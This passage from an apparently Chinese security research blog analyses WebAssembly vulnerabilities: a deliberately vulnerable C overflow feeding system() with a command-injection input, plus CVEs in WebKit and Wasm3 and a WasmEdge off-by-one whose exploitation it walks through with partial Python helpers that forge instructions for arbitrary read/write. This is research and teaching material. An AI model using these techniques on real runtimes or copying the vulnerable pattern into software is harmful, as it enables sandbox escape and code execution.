+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;emscripten.h&gt;</span><br><span class="line"></span><br><span class="line">int EMSCRIPTEN_KEEPALIVE vuln(char *p) &#123;</span><br><span class="line">    char msg[100];</span><br><span class="line">    char buf[10];</span><br><span class="line">    strcpy(msg,&quot;echo hello&quot;);</span><br><span class="line">    strcpy(buf,p);</span><br><span class="line">    system(msg);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在nodejs中调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const m = require(&#x27;./1.js&#x27;);</span><br><span class="line">m.ccall(&#x27;vuln&#x27;,&#x27;int&#x27;,[&#x27;string&#x27;],[&#x27;aaaaaaaaaals /;echo hacked;&#x27;])</span><br></pre></td></tr></table></figure>
+<p>运行结果</p>
+<img src="/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/8.png" class="" title="8.png">
+<p>还可以利用漏洞改写函数偏移，指向system并控制好参数，主动执行命令。或者是system函数参数部分可控，则可以命令注入。</p>
+<h3 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h3><p>首先需要关注WebAssembly附带的js文件，看看里面写了哪些导入和导出函数，如果是在nodejs中的WebAssembly，要是导入函数中有一些能够操作系统的函数如<code>system、open</code>等，则重点关注，然后利用<code>wasm2wat</code>将wasm文件转换为wat S表达式，审计这些函数的参数是否存在或者可以注入等漏洞；要是有溢出漏洞，则看能否覆盖参数，或者覆盖函数偏移值。</p>
+<h2 id="WebAssembly虚拟机逃逸"><a href="#WebAssembly虚拟机逃逸" class="headerlink" title="WebAssembly虚拟机逃逸"></a>WebAssembly虚拟机逃逸</h2><p>在BlackHat USA 2022的议题上我们发表了一篇名为<code>Is WebAssembly Really Safe? - WasmVMEscape andRCEVulnerabilities Have Been Found in New Way</code>的议题，讲的就是WebAssembly的虚拟机逃逸。WebAssembly虚拟机逃逸漏洞重点关注三个方面：<strong>字节码的执行漏洞、WASM二进制结构解析漏洞、导入表库函数实现中的漏洞。</strong> 这三个关注的是虚拟机的本身而不是位于虚拟机里的WASM代码，因此又可以回到传统漏洞模式的思路。</p>
+<h3 id="CVE-2022-48503"><a href="#CVE-2022-48503" class="headerlink" title="CVE-2022-48503"></a>CVE-2022-48503</h3><h4 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><p>位于Apple WebKit的<code>Source/JavaScriptCore/wasm/WasmInstance.cpp</code>中，对WebAssembly进行加载解析时，<code>m_module-&gt;moduleInformation().dataSegmentsCount()</code>的值未检查大小，是直接从WASM文件中读取的，从而导致<code>dataSegmentIndex</code>可以越界</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Instance::Instance(VM&amp; vm, JSGlobalObject* globalObject, Ref&lt;Module&gt;&amp;&amp; module)</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">    for (unsigned dataSegmentIndex = 0; dataSegmentIndex &lt; m_module-&gt;moduleInformation().dataSegmentsCount(); ++dataSegmentIndex) &#123;</span><br><span class="line">        const auto&amp; dataSegment = m_module-&gt;moduleInformation().data[dataSegmentIndex];</span><br><span class="line">        if (dataSegment-&gt;isPassive())</span><br><span class="line">            m_passiveDataSegments.quickSet(dataSegmentIndex);</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>在<code>Source/JavaScriptCore/wasm /WasmSectionParser.cpp</code>文件中添加了一个检查<br>auto SectionParser::parseDataCount() -&gt; PartialResult<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;uint32_t numberOfDataSegments;<br>&nbsp;&nbsp;&nbsp;&nbsp;WASM_PARSER_FAIL_IF(!parseVarUInt32(numberOfDataSegments), “can’t get Data Count section’s count”);<br>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#ff0000">WASM_PARSER_FAIL_IF(numberOfDataSegments &gt; maxDataSegments, “Data Count section’s count is too big “, numberOfDataSegments , “ maximum “, maxDataSegments);</font><br>&nbsp;&nbsp;&nbsp;&nbsp;m_info-&gt;numberOfDataSegments &#x3D; numberOfDataSegments;<br>&nbsp;&nbsp;&nbsp;&nbsp;return { };<br>}</p>
+<h3 id="CVE-2022-28990"><a href="#CVE-2022-28990" class="headerlink" title="CVE-2022-28990"></a>CVE-2022-28990</h3><p>WebAssembly的导入库函数是一个可研究的方向，导入函数可以从wasm转为S表达式后的<code>import表中看到</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(import &quot;env&quot; &quot;system&quot; (func (;0;) (type 0)))</span><br><span class="line">(import &quot;wasi_snapshot_preview1&quot; &quot;fd_close&quot; (func (;1;) (type 0)))</span><br><span class="line">(import &quot;wasi_snapshot_preview1&quot; &quot;fd_read&quot; (func (;2;) (type 10)))</span><br><span class="line">(import &quot;env&quot; &quot;emscripten_resize_heap&quot; (func (;3;) (type 0)))</span><br><span class="line">(import &quot;env&quot; &quot;emscripten_memcpy_js&quot; (func (;4;) (type 13)))</span><br><span class="line">(import &quot;wasi_snapshot_preview1&quot; &quot;fd_seek&quot; (func (;5;) (type 12)))</span><br></pre></td></tr></table></figure>
+<p>有的导入函数来自于JS层写的自定义函数，有点则来自于虚拟机自身实现的库函数。例如在上面我们看到<code>system</code>函数是从<code>env</code>导入的，而<code>fd_read</code>则是从<code>wasi_snapshot_preview1</code>导入的，对应的我们在js文件中看到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var wasmImports = &#123;</span><br><span class="line">  /** @export */</span><br><span class="line">  emscripten_memcpy_js: _emscripten_memcpy_js,</span><br><span class="line">  /** @export */</span><br><span class="line">  emscripten_resize_heap: _emscripten_resize_heap,</span><br><span class="line">  /** @export */</span><br><span class="line">  fd_close: _fd_close,</span><br><span class="line">  /** @export */</span><br><span class="line">  fd_read: _fd_read,</span><br><span class="line">  /** @export */</span><br><span class="line">  fd_seek: _fd_seek,</span><br><span class="line">  /** @export */</span><br><span class="line">  system: _system</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function createWasm() &#123;</span><br><span class="line">  // prepare imports</span><br><span class="line">  var info = &#123;</span><br><span class="line">    &#x27;env&#x27;: wasmImports,</span><br><span class="line">    &#x27;wasi_snapshot_preview1&#x27;: wasmImports,</span><br><span class="line">  &#125;;</span><br><span class="line">...</span><br><span class="line">  instantiateAsync(wasmBinary, wasmBinaryFile, info, receiveInstantiationResult);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>可以看到emcc生成的WASM JS接口文件同时指定了<code>env</code>和<code>wasi_snapshot_preview1</code>表。实际上<code>wasi_snapshot_preview1</code>库是<code>WebAssembly System Interface(WASI)</code>标准的库，<code>WASI</code>是一套系统API接口，拥有像<code>fd_write、fd_read、sock_accept</code>等系统函数，某些WebAssembly虚拟机会在内部实现自己的一套WASI，对于这种有自己实现WASI接口的WebAssembly虚拟机，在JS层就无需再去实现<code>wasi_snapshot_preview1</code>的导入函数。</p>
+<p>Wasm3是一款能够在嵌入式设备上运行的WebAssembly虚拟机，在嵌入式设备上使用WebAssembly的优点是可以做到类似于Java一样的<code>一次编译到处运行</code>，无需考虑嵌入式设备的底层适配。</p>
+<img src="/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/9.png" class="" title="9.png">
+<p>Wasm3内部实现了<code>WASI</code>标准，而漏洞则出现在库函数<code>fd_write、fd_read</code>中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># define m3ApiOffsetToPtr(offset)   (void*)((uint8_t*)_mem + (uint32_t)(offset))</span><br><span class="line">#  define m3ApiReadMem32(ptr)        m3_bswap32((* (uint32_t *)(ptr)))</span><br><span class="line"></span><br><span class="line">static inline</span><br><span class="line">void copy_iov_to_host(void* _mem, struct iovec* host_iov, wasi_iovec_t* wasi_iov, int32_t iovs_len)</span><br><span class="line">&#123;</span><br><span class="line">    // Convert wasi memory offsets to host addresses</span><br><span class="line">    for (int i = 0; i &lt; iovs_len; i++) &#123;</span><br><span class="line">        host_iov[i].iov_base = m3ApiOffsetToPtr(m3ApiReadMem32(&amp;wasi_iov[i].buf));</span><br><span class="line">        host_iov[i].iov_len  = m3ApiReadMem32(&amp;wasi_iov[i].buf_len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">m3ApiRawFunction(m3_wasi_generic_fd_read)</span><br><span class="line">&#123;</span><br><span class="line">    m3ApiReturnType  (uint32_t)</span><br><span class="line">    m3ApiGetArg      (__wasi_fd_t          , fd)</span><br><span class="line">    m3ApiGetArgMem   (wasi_iovec_t *       , wasi_iovs)</span><br><span class="line">    m3ApiGetArg      (__wasi_size_t        , iovs_len)</span><br><span class="line">    m3ApiGetArgMem   (__wasi_size_t *      , nread)</span><br><span class="line"></span><br><span class="line">    m3ApiCheckMem(wasi_iovs,    iovs_len * sizeof(wasi_iovec_t));</span><br><span class="line">    m3ApiCheckMem(nread,        sizeof(__wasi_size_t));</span><br><span class="line"></span><br><span class="line">#if defined(HAS_IOVEC)</span><br><span class="line">    struct iovec iovs[iovs_len];</span><br><span class="line">    copy_iov_to_host(_mem, iovs, wasi_iovs, iovs_len);</span><br><span class="line"></span><br><span class="line">    ssize_t ret = readv(fd, iovs, iovs_len);</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>在函数<code>copy_iov_to_host</code>中，使用<code>m3ApiOffsetToPtr</code>对WASM字节码传过来的<code>offset</code>进行转换，即加上<code>_mem</code>的地址，得到要读取的目标地址，漏洞出现在没有对<code>offset</code>进行检查，可以传入任意的offset从而溢出<code>_mem</code>，实现任意地址写；同理，<code>fd_write则可以实现任意地址读</code><br>如下的<code>POC</code>读取了<code>_mem + 0x10000</code>处的数据</p>
+<img src="/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/10.png" class="" title="10.png">
+
+<h3 id="Off-by-One-in-WasmEdge"><a href="#Off-by-One-in-WasmEdge" class="headerlink" title="Off by One in WasmEdge"></a>Off by One in WasmEdge</h3><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>WasmEdge是另一款WebAssembly虚拟机</p>
+<img src="/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/11.png" class="" title="11.png">
+<p>在其迭代的开发版本中曾经出现过一个字节码的off by one漏洞。Executor::execute函数是WasmEdge解释执行WebAssembly字节码的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Expect&lt;void&gt; Executor::execute(Runtime::StoreManager &amp;StoreMgr,</span><br><span class="line">                               Runtime::StackManager &amp;StackMgr,</span><br><span class="line">                               const AST::InstrView::iterator Start,</span><br><span class="line">                               const AST::InstrView::iterator End) &#123;</span><br><span class="line">  AST::InstrView::iterator PC = Start;</span><br><span class="line">  AST::InstrView::iterator PCEnd = End;</span><br><span class="line">  auto Dispatch = [this, &amp;PC, &amp;StoreMgr, &amp;StackMgr]() -&gt; Expect&lt;void&gt; &#123;</span><br><span class="line">    const AST::Instruction &amp;Instr = *PC;</span><br><span class="line">    switch (Instr.getOpCode()) &#123;</span><br><span class="line">    ......</span><br><span class="line">    case OpCode::Br:</span><br><span class="line">      return runBrOp(StackMgr, Instr, PC);</span><br><span class="line">   ......</span><br><span class="line"> &#125;;</span><br><span class="line">  while (PC != PCEnd) &#123;</span><br><span class="line">    OpCode Code = PC-&gt;getOpCode();</span><br><span class="line">    ......</span><br><span class="line">    if (auto Res = Dispatch(); !Res) &#123;</span><br><span class="line">      return Unexpect(Res);</span><br><span class="line">    &#125;</span><br><span class="line">    PC++;</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>重点关注<code>OpCode::Br</code>指令的实现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Expect&lt;void&gt; Executor::runBrOp(Runtime::StackManager &amp;StackMgr,</span><br><span class="line">                               const AST::Instruction &amp;Instr,</span><br><span class="line">                               AST::InstrView::iterator &amp;PC) noexcept &#123;</span><br><span class="line">  return branchToLabel(StackMgr, Instr.getJump().StackEraseBegin,</span><br><span class="line">                       Instr.getJump().StackEraseEnd, Instr.getJump().PCOffset,</span><br><span class="line">                       PC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Expect&lt;void&gt; Executor::branchToLabel(Runtime::StackManager &amp;StackMgr,</span><br><span class="line">                                     uint32_t EraseBegin, uint32_t EraseEnd,</span><br><span class="line">                                     int32_t PCOffset,</span><br><span class="line">                                     AST::InstrView::iterator &amp;PC) noexcept &#123;</span><br><span class="line">  // Check stop token</span><br><span class="line">  if (unlikely(StopToken.exchange(0, std::memory_order_relaxed))) &#123;</span><br><span class="line">    spdlog::error(ErrCode::Interrupted);</span><br><span class="line">    return Unexpect(ErrCode::Interrupted);</span><br><span class="line">  &#125;</span><br><span class="line">  StackMgr.stackErase(EraseBegin, EraseEnd);</span><br><span class="line">  PC += PCOffset;</span><br><span class="line">  return &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>branchToLabel会把<code>PC</code>加上<code>PCOffset</code>，但是在<code>Executor::execute</code>的尾部还有一个<code>PC++</code><br>Expect<void> Executor::execute(Runtime::StoreManager &amp;StoreMgr,<br>                               Runtime::StackManager &amp;StackMgr,<br>                               const AST::InstrView::iterator Start,<br>                               const AST::InstrView::iterator End) {<br>……<br>  AST::InstrView::iterator PC &#x3D; Start;<br>……<br>  while (PC !&#x3D; PCEnd) {<br>    OpCode Code &#x3D; PC-&gt;getOpCode();<br>    ……<br>    if (auto Res &#x3D; Dispatch(); !Res) {<br>      return Unexpect(Res);<br>    }<br>    <font color="#ff0000">PC++;</font><br>  }</p>
+<p>在某种情况下，<code>auto Res = Dispatch()</code>处理<code>Br</code>指令，将PC加上<code>PCOffset</code>，此时PC的值将等于<code>PCEnd</code>，但是循环还没结束，后面还有一条<code>PC++</code>语句，执行后，<code>PC == PCEnd + 1</code>，此后<code>while (PC != PCEnd)</code>将永远成立，那么就会继续读取<code>PCEnd + 1</code>处的数据结构来执行。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>WasmEdge在运行WASM时首先会进行解析编译，构造出两个栈，一个执行栈<code>_pc stack</code>，另一个则是数据栈<code>_sp stack</code>，<code>_pc stack</code>是在解析时生成的，字节码无法操作<code>_pc stack</code>，只能操作数据栈<code>_sp stack</code>，正如WebAssmebly标准定义的那样。<code>_pc stack</code>中的所有数据，例如<code>下标</code>，都是在解析时检查通过的，如果某个下标能够溢出数据栈，将在解析时被检查到，从而终止wasm的解析，进而也不会执行。</p>
+<img src="/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/12.png" class="" title="12.png">
+<p>漏洞的情况表现如下</p>
+<img src="/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/13.png" class="" title="13.png">
+<p>对于WebAssmebly虚拟机自己来说，PCEnd+1在<code>_pc stack</code>这块堆内存之外，如果能够在<code>PCEnd + 1</code>处布置自定义的数据，漏洞将得以利用。这是因为前面提到，<code>PC</code>栈里的数据都是经过检查的，这里再补充一条就是在运行时，这些<code>Opcode</code>的处理函数<code>Handler</code>将不会再次检查参数。<br>例如<code>global.set</code>指令的处理函数如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Expect&lt;void&gt; Executor::runGlobalSetOp(Runtime::StackManager &amp;StackMgr,</span><br><span class="line">                                      uint32_t Idx) const noexcept &#123;</span><br><span class="line">  auto *GlobInst = getGlobInstByIdx(StackMgr, Idx);</span><br><span class="line">  assuming(GlobInst);</span><br><span class="line">  GlobInst-&gt;getValue() = StackMgr.pop();</span><br><span class="line">  return &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line">Runtime::Instance::GlobalInstance *</span><br><span class="line">Executor::getGlobInstByIdx(Runtime::StackManager &amp;StackMgr,</span><br><span class="line">                           const uint32_t Idx) const &#123;</span><br><span class="line">......</span><br><span class="line">  return ModInst-&gt;unsafeGetGlobal(Idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GlobalInstance *unsafeGetGlobal(uint32_t Idx) const noexcept &#123;</span><br><span class="line">    return GlobInsts[Idx];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>unsafeGetGlobal直接使用了从<code>PC</code>栈中获取的下标来读取数据，并不检查下标是否越界，因为在WASM解析时就已经做过了下标边界的检查，无需再检查。<br>现在由于漏洞溢出的原因，<code>PC</code>将继续从后面的内存进行取值，而后面的内存我们是可以在一定程度上控制的，比如我们伪造一条<code>global.set</code>的指令结构体，并将Idx下标设置为我们想要的任意值，将能够实现<code>任意地址写</code>。</p>
+<p>我们可以<code>使用i64.const来进行堆风水的布局</code></p>
+<img src="/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/14.png" class="" title="14.png">
+<p>这是因为运行时，此类opcode的处理就是向C++的<code>vector</code>中push一个新的数据，而<code>vector</code>是可以进行内存分配的，只要不断的压入数据，就能分配很多的内存。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">case OpCode::I32__const:</span><br><span class="line">case OpCode::I64__const:</span><br><span class="line">case OpCode::F32__const:</span><br><span class="line">case OpCode::F64__const:</span><br><span class="line">  StackMgr.push(Instr.getNum());</span><br><span class="line">  return &#123;&#125;;</span><br></pre></td></tr></table></figure>
+<p>因此我们在POC中写了很多的<code>i64.const</code>指令，最终的效果如下</p>
+<img src="/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/15.png" class="" title="15.png">
+<p>不幸的是End后面的内存并不完全可控，幸运的是我们能够控制<code>End + 1</code>的位置的第三个字段的值，查看指令结构体</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct Instruction &#123;</span><br><span class="line">      uint32_t JumpEnd;</span><br><span class="line">      uint32_t JumpElse;</span><br><span class="line">      BlockType ResType;</span><br><span class="line">      uint32_t Offset = 0;</span><br><span class="line">      OpCode Code;</span><br><span class="line">      struct &#123;</span><br><span class="line">         bool IsAllocLabelList : 1;</span><br><span class="line">         bool IsAllocValTypeList : 1;</span><br><span class="line">      &#125; Flags;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>可控位置正好对应了指令结构体中的<code>Code</code>成员，也就是opcode能够任意指定，能够跳转到任何的opcode的handler中去执行，但是相关参数不可控制。一个好的思路是看能否执行某条<code>Opcode Handler</code>,将<code>PC</code>指向完全可控区。其中一条<code>Else</code>指令可以被利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Expect&lt;void&gt; Executor::execute(Runtime::StoreManager &amp;StoreMgr,</span><br><span class="line">......</span><br><span class="line">    case OpCode::Else:</span><br><span class="line">......</span><br><span class="line">      PC += PC-&gt;getJumpEnd();</span><br><span class="line">      [[fallthrough]];</span><br><span class="line">    case OpCode::End:</span><br><span class="line">      PC = StackMgr.maybePopFrame(PC);</span><br><span class="line">      return &#123;&#125;;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>处理Else指令时，会将<code>PC</code>加上<code>getJumpEnd()</code></p>
+<img src="/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/16.png" class="" title="16.png">
+<p>在内存中看到对应<code>JumpEnd</code>的位置数据为<code>0x154</code>，意味着我们可以让<code>PC += 0x154</code>，这已经足够让我们将<code>PC</code>指向可控区了。<br>由于<code>Instruction</code>结构体的大小为32字节，而数据栈中的32字节的数据类型有<code>v128.const i64x2</code>，因此我们可以用<code>v128.const i64x2</code>来伪造整个<code>Instruction</code>结构体。最终的效果如下，在<code>PCEnd+1</code>处伪造一条<code>Else</code>指令，将<code>PC</code>转移到数据栈中，并执行伪造的一系列指令。</p>
+<img src="/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/17.png" class="" title="17.png">
+<p>例如<code>global.get</code>和<code>global.set</code>的伪造如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">def Global_Get(index):</span><br><span class="line">   global i</span><br><span class="line">   i += 2</span><br><span class="line">   code = &#x27;nop\n&#x27;</span><br><span class="line">   code += &#x27;v128.const i64x2 %d 0\n&#x27; % (index)</span><br><span class="line">   code += &#x27;nop\n&#x27;</span><br><span class="line">   code += &#x27;v128.const i64x2 0x2300000000 0\n&#x27;</span><br><span class="line">   return code</span><br><span class="line">def Global_Set(index):</span><br><span class="line">   global i</span><br><span class="line">   i += 2</span><br><span class="line">   code = &#x27;nop\n&#x27;</span><br><span class="line">   code += &#x27;v128.const i64x2 %d 0\n&#x27; % (index)</span><br><span class="line">   code += &#x27;nop\n&#x27;</span><br><span class="line">   code += &#x27;v128.const i64x2 0x2400000000 0\n&#x27;</span><br><span class="line">   return code</span><br><span class="line">def i32_const(value):</span><br><span class="line">   global i</span><br><span class="line">   i += 2</span><br><span class="line">   code = &#x27;nop\n&#x27;</span><br><span class="line">   code += &#x27;v128.const i64x2 %d 0\n&#x27; % (value)</span><br><span class="line">   code += &#x27;nop\n&#x27;</span><br><span class="line">   code += &#x27;v128.const i64x2 0x4100000000 0\n&#x27;</span><br><span class="line">   return code</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>通过设置index，能够实现任意地址读写，进而构造后续RCE。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>目前还很少爆出WebAssmebly相关产品的漏洞，或许未来会有更多使用WebAssmebly的产品，本文为其研究提供了一种思路。对代码本身的漏洞，在WebAssmebly里会受到限制进而导致传统漏洞模式变得难以利用，但是仍然具有挖掘的方面。对于WebAssmebly虚拟机，不同的厂商可能实现不一样，可以针对其中的<strong>数据结构解析、指令执行、导入函数的底层实现</strong>入手，挖掘虚拟机本身的漏洞进而达到虚拟机逃逸控制主机的目的。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/68048524">WebAssembly完全入门——了解wasm的前世今身</a><br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/WebAssembly/C_to_Wasm">编译 C&#x2F;C++ 为 WebAssembly</a><br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/WebAssembly/Understanding_the_text_format">理解 WebAssembly 文本格式</a><br><a target="_blank" rel="noopener" href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web-wp.pdf">us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web-wp</a><br><a target="_blank" rel="noopener" href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web.pdf">us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web</a><br><a target="_blank" rel="noopener" href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Silvanovich-The-Problems-and-Promise-of-WebAssembly.pdf">us-18-Silvanovich-The-Problems-and-Promise-of-WebAssembly</a><br><a target="_blank" rel="noopener" href="https://www.usenix.org/system/files/sec20-lehmann.pdf">Everything Old is New Again: Binary Security of WebAssembly</a><br><a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-22/Wednesday/US-22-Hai-Is-WebAssembly-Really-Safe-wp.pdf">US-22-Hai-Is-WebAssembly-Really-Safe-wp</a><br><a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-22/Wednesday/US-22-Hai-Is-WebAssembly-Really-Safe.pdf">US-22-Hai-Is-WebAssembly-Really-Safe</a><br><a href="https://github.com/WebAssembly/WASI/blob/main/legacy/preview1/docs.md">WASI API</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
